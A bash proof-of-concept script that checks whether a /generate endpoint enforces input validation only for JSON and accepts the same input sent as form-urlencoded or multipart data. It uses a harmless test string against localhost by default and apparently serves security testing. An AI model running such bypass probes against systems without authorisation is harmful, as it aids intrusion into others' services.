#!/bin/bash

# POC: Content-Type Input Validation Bypass
# This script demonstrates how changing the Content-Type header bypasses
# the input validation on the /generate endpoint

TARGET_URL="${1:-http://localhost:4567}"
ENDPOINT="/generate"

echo "========================================="
echo "Content-Type Validation Bypass POC"
echo "Target: $TARGET_URL$ENDPOINT"
echo "========================================="
echo ""

# Test Input
TEST_SENTENCE="hello"

# Test 1: JSON Format (Expected to be REJECTED)
echo "[TEST 1] Sending request with Content-Type: application/json"
echo "Payload: {\"sentence\": \"$TEST_SENTENCE\"}"
echo ""

JSON_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d "{\"sentence\": \"$TEST_SENTENCE\"}")

JSON_BODY=$(echo "$JSON_RESPONSE" | head -n -1)
JSON_STATUS=$(echo "$JSON_RESPONSE" | tail -n 1)

echo "Response Status: $JSON_STATUS"
echo "Response Body: $JSON_BODY"
echo ""

# Test 2: Form URL-Encoded Format (Expected to be ACCEPTED)
echo "[TEST 2] Sending request with Content-Type: application/x-www-form-urlencoded"
echo "Payload: sentence=$TEST_SENTENCE"
echo ""

FORM_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL$ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "sentence=$TEST_SENTENCE")

FORM_BODY=$(echo "$FORM_RESPONSE" | head -n -1)
FORM_STATUS=$(echo "$FORM_RESPONSE" | tail -n 1)

echo "Response Status: $FORM_STATUS"
echo "Response Body: $FORM_BODY"
echo ""

# Test 3: Multipart Form-Data Format (Expected to be ACCEPTED)
echo "[TEST 3] Sending request with Content-Type: multipart/form-data"
echo "Payload: sentence=$TEST_SENTENCE"
echo ""

MULTIPART_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL$ENDPOINT" \
  -F "sentence=$TEST_SENTENCE")

MULTIPART_BODY=$(echo "$MULTIPART_RESPONSE" | head -n -1)
MULTIPART_STATUS=$(echo "$MULTIPART_RESPONSE" | tail -n 1)

echo "Response Status: $MULTIPART_STATUS"
echo "Response Body: $MULTIPART_BODY"
echo ""

# Analysis
echo "========================================="
echo "ANALYSIS"
echo "========================================="
echo ""

if [ "$JSON_STATUS" != "200" ] && ([ "$FORM_STATUS" = "200" ] || [ "$MULTIPART_STATUS" = "200" ]); then
  echo "✓ VULNERABILITY CONFIRMED"
  echo ""
  echo "The same input is REJECTED with JSON (Status: $JSON_STATUS)"
  echo "but ACCEPTED with form-urlencoded/multipart (Status: $FORM_STATUS/$MULTIPART_STATUS)"
  echo ""
  echo "This proves that input validation is inconsistently enforced"
  echo "based on the Content-Type header, allowing bypasses of validation logic."
  exit 0
else
  echo "✗ Validation appears consistent across content types"
  echo "JSON Status: $JSON_STATUS"
  echo "Form Status: $FORM_STATUS"
  echo "Multipart Status: $MULTIPART_STATUS"
  exit 1
fi